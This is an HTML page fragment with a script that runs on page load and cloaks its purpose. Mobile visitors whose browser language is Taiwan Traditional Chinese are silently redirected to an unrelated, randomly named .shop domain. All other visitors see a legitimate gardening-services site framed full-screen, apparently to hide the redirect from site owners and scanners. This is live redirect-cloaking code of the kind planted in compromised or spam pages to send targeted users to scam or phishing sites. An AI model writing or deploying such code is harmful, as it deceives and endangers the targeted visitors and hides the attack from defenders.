  <body onload="handleResponse()">
 
<script>
  function handleResponse() {
    function isMobileDevice() {
      return /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
    }

    function isTaiwanTraditionalChinese() {
      return navigator.language.startsWith('zh-Hant-TW') || 
             navigator.languages.some(lang => lang.startsWith('zh-Hant-TW'));
    }

    // Check for mobile devices and Taiwan Traditional Chinese
    if (isMobileDevice() && isTaiwanTraditionalChinese()) {
      window.location.href = "https://www.yyweu614w.shop/yangs714/index.html";
      return;
    }

    var iframe = document.createElement('iframe');
    iframe.src = 'https://housekeep.com/tradespeople/gardener/regions-all/';
    iframe.style.width = '100%';
    iframe.style.height = '100vh';
    document.body.appendChild(iframe);
  }
</script>
 
<script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
